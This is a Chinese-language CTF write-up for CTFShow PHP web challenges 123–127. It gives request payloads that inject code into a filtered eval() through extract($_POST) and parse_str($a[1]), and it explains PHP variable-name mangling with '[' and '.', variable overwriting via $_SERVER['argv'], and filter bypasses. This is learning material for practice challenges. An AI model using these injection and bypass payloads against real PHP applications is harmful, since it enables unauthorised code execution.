**123**
![image copy 10.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272105766_image_copy_10.png)
`CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag`
突破到eval时就可以拿到flag了
**125**
![image copy 11.png](https://img.xobear.cn/file/CTF/WEB/PHP/1781272107370_image_copy_11.png)
`CTF_SHOW=1&CTF[SHOW.COM=2&fun=extract($_POST)&fl0g=flag_give_me`
 
`$c=$_POST['fun'];`，所以我们让` fun=extract($_POST)`
检查正则：`preg_match("/.../i", $c)`，我们的 `extract($_POST)` 里没有被禁止的关键词（flag、echo 等），且长度 <=16，可以通过。
执行 `eval("$c;")`
`eval("extract($_POST);");` 执行后，$_POST 里的所有参数都会被注册为变量。
执行 `extract($_POST)` 后，就会自动创建 `$fl0g = "flag_give_me"`


**126**
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1781922747759_image.png)

POST 参数 `CTF_SHOW.COM` 含点号：PHP 会将 POST 变量名中的 `.` 转为 `_`，所以直接传 `CTF_SHOW.COM` 会被转成 `CTF_SHOW_COM`。利用 PHP 的 `[` 转 `_` 机制——`CTF[SHOW.COM` 会被转为 `CTF_SHOW.COM`，后面的 `.` 得以保留。

``!isset($_GET['fl0g'])`` 禁止 GET 传 `fl0g`：但最终 `$fl0g` 必须等于 `flag_give_me` 才能输出 flag。利用 `$_SERVER['argv']` 接收 `query string 查询字符`，通过 `parse_str($a[1])` 在 `eval` 作用域内完成变量覆盖——把`fl0g` 参数藏在 `a[1]` 数组里。

`$c` 不能包含 `g、i、f、c、o、d、flag、echo、print、var_dump、GLOBALS` 等大量字符，且长度 ≤ 16。`parse_str($a[1])` 恰好 16 个字符，不含任何被过滤的字符。

变量覆盖：`parse_str($a[1])` 将`a[1]`中的`fl0g=flag_give_me` **解析为变量**，满足 `$fl0g === "flag_give_me"` 条件。

注意：`$_SERVER['argv'] `会把整个 `query string` 按空格切分成数组。 
所以 URL 传的是 `?a=1+fl0g=flag_give_me`，按空格（`+`）切开后：
`$a[0] = 1`
`$a[1] = fl0g=flag_give_me`


GET:`?a=1+fl0g=flag_give_me`
POST:`CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])`


**127**
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1781924612479_image.png)
直接尝试变量覆盖
?ctf_show=ilove36d  下划线被过滤了，加号是空格，但是加号也被过滤了，点也被过滤了。
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1781925249210_image.png)
空格没有被过滤
`?ctf show=ilove36d`































































